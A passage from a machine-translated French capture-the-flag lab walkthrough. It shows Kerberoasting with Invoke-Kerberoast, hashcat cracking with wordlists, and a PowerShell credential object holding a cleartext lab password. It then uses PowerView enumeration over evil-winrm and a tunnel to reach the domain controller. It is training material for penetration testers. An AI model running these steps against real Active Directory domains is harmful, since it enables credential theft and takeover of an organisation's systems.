<span class="hljs-built_in">Invoke-Kerberoast</span> <span class="hljs-literal">-erroraction</span> silentlycontinue <span class="hljs-literal">-OutputFormat</span> Hashcat | <span class="hljs-built_in">Select-Object</span> Hash | <span class="hljs-built_in">Out-File</span> <span class="hljs-literal">-filepath</span> <span class="hljs-string">'C:\temp\kerb_hashes.txt'</span> <span class="hljs-literal">-Width</span> <span class="hljs-number">8000</span>
<span class="hljs-built_in">type</span> kerb_hashes.txt</code></pre><br>
<img src="https://habrastorage.org/webt/yx/1w/u9/yx1wu93j1to_zllmxgnhcos-afi.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ensuite, vous devez trier ces hachages. Puisqu'il n'y avait aucune donnée de mot de passe dans le dictionnaire rockyou, j'ai utilisé TOUS les dictionnaires de mots de passe fournis par Seclists. Pour la recherche, nous utilisons hashcat.</font></font><br>
<br>
<pre><code class="bash hljs">hashcat -a 0 -m 13100 krb_hashes.txt /usr/share/seclists/Passwords/*.txt --force</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous trouvons les deux mots de passe, le premier dans le dictionnaire dutch_passwordlist.txt et le second dans Keyboard-Combinations.txt. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/0b/5y/wf/0b5ywfghlgdiz2j9qhs31omv5cu.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/j4/tb/zn/j4tbznqjl3gr9fcuu9xlyedgpq0.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et donc nous avons trois utilisateurs, allez au contrôleur de domaine. Nous découvrons d'abord son adresse. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ky/ch/jv/kychjvk-alnhztcgb9ke1elcbr8.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ok, nous avons découvert l'adresse IP du contrôleur de domaine. Découvrons tous les utilisateurs du domaine, ainsi que celui d'entre eux qui est l'administrateur. Pour télécharger le script pour obtenir des informations PowerView.ps1. Connectez-vous ensuite à l'aide de evil-winrm en spécifiant le répertoire avec le script dans le paramètre -s. Et puis il suffit de charger le script PowerView. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/in/pj/g6/inpjg6yjboxjl2mmm-idf7bxnby.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant, toutes ses fonctions sont à notre disposition. L'utilisateur p00_adm ressemble à un utilisateur privilégié, nous allons donc travailler dans son contexte. Créez un objet PSCredential pour cet utilisateur.</font></font><br>
<br>
<pre><code class="powershell hljs"><span class="hljs-variable">$User</span> = <span class="hljs-string">'p00_adm'</span>
<span class="hljs-variable">$Password</span> = <span class="hljs-string">'ZQ!5t4r'</span>
<span class="hljs-variable">$Cpass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-variable">$Password</span> <span class="hljs-literal">-force</span>
<span class="hljs-variable">$Creds</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Cpass</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant, toutes les commandes Powershell, où nous spécifions Creds, seront exécutées au nom de p00_adm. </font><font style="vertical-align: inherit;">Listons les utilisateurs et l'attribut AdminCount.</font></font><br>
<br>
<pre><code class="powershell hljs"><span class="hljs-built_in">Get-NetUser</span> <span class="hljs-literal">-DomainController</span> dc <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Creds</span> | <span class="hljs-built_in">select</span> name,admincount</code></pre><br>
<img src="https://habrastorage.org/webt/ls/f-/dj/lsf-djkkzvds5ldjc5dpxzxldzi.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et donc, notre utilisateur est vraiment privilégié. </font><font style="vertical-align: inherit;">Jetons un coup d'œil aux groupes dans lesquels il est composé.</font></font><br>
<br>
<pre><code class="powershell hljs"><span class="hljs-built_in">Get-NetGroup</span> <span class="hljs-literal">-UserName</span> <span class="hljs-string">"p00_adm"</span> <span class="hljs-literal">-DomainController</span> dc <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Creds</span></code></pre><br>
<img src="https://habrastorage.org/webt/0i/da/v3/0idav3lcaomgr7tilfhcjaw249q.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous affirmons que l'utilisateur est un administrateur de domaine. Cela lui donne le droit de se connecter à distance au contrôleur de domaine. Essayons d'entrer via WinRM en utilisant notre tunnel. J'ai été confus par les erreurs générées par reGeorg lors de l'utilisation de evil-winrm. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xj/ux/yl/xjuxyl8tpyd1bobnbyta3tiiayy.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ensuite, nous utiliserons un autre </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">script</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> plus simple </font><font style="vertical-align: inherit;">pour se connecter à WinRM. Ouvrez et modifiez les paramètres de la connexion. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/82/kb/je/82kbjeugczagin5d1v1h2xo9_0m.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous essayons de nous connecter et nous sommes dans le système. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/v6/gs/yl/v6gsyl1rnhmxn8etxybln4qvwcc.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais il n'y a pas de drapeau. Regardez ensuite l'utilisateur et vérifiez les bureaux. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/o3/qq/ym/o3qqymhx-ntmpd0audycjka07fo.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Chez mr3ks, nous trouvons le drapeau et le laboratoire est passé à 100%. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sl/m7/fj/slm7fj0mnm5r4beu96duwg7ogjo.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
C'est tout. À titre de rétroaction, indiquez si vous avez appris quelque chose de nouveau dans cet article et si cela vous a été utile. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vous pouvez nous rejoindre sur </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">Vous y trouverez du matériel intéressant, des cours fusionnés ainsi que des logiciels. </font><font style="vertical-align: inherit;">Créons une communauté dans laquelle il y aura des gens qui connaissent bien de nombreux domaines de l'informatique, puis nous pourrons toujours nous entraider pour tout problème informatique et de sécurité de l'information.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr504890/index.html">Renvoyer la valeur de la commande d'invocation de powershell à l'Agent SQL-Server</a></li>
<li><a href="../fr504894/index.html">GUI en russe, ou terminal VKS faites-le vous-même</a></li>
<li><a href="../fr504902/index.html">Les 9 principales tendances des tests automatisés en 2020</a></li>
<li><a href="../fr504906/index.html">PHP - quelle est la niche du langage et PHP8 aidera-t-il à résoudre les problèmes urgents (spoiler: IMHO pas)</a></li>
<li><a href="../fr504908/index.html">PyTrace - Débogueur de voyage dans le temps pour Python</a></li>
<li><a href="../fr504918/index.html">Les services de cours en ligne les plus efficaces pour les étudiants et les enseignants: les cinq premiers</a></li>
<li><a href="../fr504924/index.html">Comment comprendre qu'un projet est un projet et l'exécuter correctement</a></li>
<li><a href="../fr504926/index.html">Comment choisir le meilleur outil d'automatisation pour votre travail dans Revit. Concepteurs vs programmeurs</a></li>
<li><a href="../fr504936/index.html">TechTrain 2020: "festival à la volée" gratuit</a></li>
<li><a href="../fr504938/index.html">Maman, je suis streamer maintenant</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>